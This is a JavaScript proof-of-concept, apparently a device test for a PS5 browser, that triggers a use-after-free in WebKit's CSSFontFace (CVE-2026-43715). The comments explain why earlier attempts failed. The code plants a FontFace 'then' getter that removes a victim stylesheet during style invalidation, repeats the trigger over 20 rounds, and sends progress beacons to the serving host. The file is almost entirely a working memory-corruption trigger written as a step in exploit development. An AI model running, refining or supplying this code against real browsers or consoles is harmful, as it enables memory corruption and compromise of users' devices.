// p445 v4 — CVE-2026-43715 CSSFontFace setStatus UAF device test
// Beacon prefix: V445-
//
// Runs 1-3 (new FontFace() + style victims + fonts.delete): getter reentry
// confirmed 235x, no crash. Source work explains why: the upstream
// regression test (font-face-load-crash.html, fix 5aedb82710ba578f) uses a
// CSS-CREATED face, not new FontFace(). Only CSS-created faces have the
// CSSFontSelector as a client (CSSFontFace.cpp:100). The victim style
// removal triggers stylesheet invalidation which disconnects the selector
// mid-iteration and frees the face while setStatus is still looping.
//
// v4 ports the upstream PoC exactly, with beacons and per-round repetition:
//   1. victim style <style id=v>x{}</style>
//   2. font style with @font-face { font-family: <unique>; src:
//      local(Helvetica) }   (the only source that reaches Success on PS5)
//   3. offsetHeight, find the face in document.fonts, touch face.loaded
//   4. FontFace.prototype.then getter removes #v + offsetHeight
//   5. face.load()
//
// Crash signature: beacons stop after THEN-n; the User's Guide shows the
// browser error page.

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V445-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT4');

  window.onerror = function(msg, src, line, col) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 120) +
      '-L' + line + '-C' + col);
    return false;
  };

  var SRC = 'local(Helvetica)';
  var hits = 0;

  // Upstream getter, verbatim operations. Removing ANY stylesheet (here the
  // victim style) triggers synchronous style invalidation, which is what
  // disconnects the CSSFontSelector client mid-iteration.
  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      B('THEN-' + hits);
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;
        B('VR-' + hits);
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  function round(i) {
    var fam = 't' + i;

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: ' + fam + '; src: ' + SRC + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    B('R' + i);

    var face;
    try {
      face = Array.prototype.slice.call(document.fonts)
        .find(function(f) { return f.family === fam; });
    } catch (e) {
      B('ENUM-ERR-' + encodeURIComponent(String(e)).slice(0, 80));
      return;
    }
    if (!face) { B('NOFACE-' + i); return; }

    void face.loaded; // touch the promise like the upstream test

    B('LOAD-' + i);
    face.load().then(
      function() { B('OK-' + i + '-H' + hits); },
      function(e) { B('NO-' + i + '-' + encodeURIComponent(String(e)).slice(0, 80) + '-H' + hits); }
    );

    // also keep some font styles around: repeated invalidations with faces
    // alive is the state the upstream test builds toward
  }

  var i = 0;
  (function step() {
    if (i >= 20) { B('DONE-H' + hits); return; }
    round(i);
    i++;
    setTimeout(step, 400);
  })();
})();
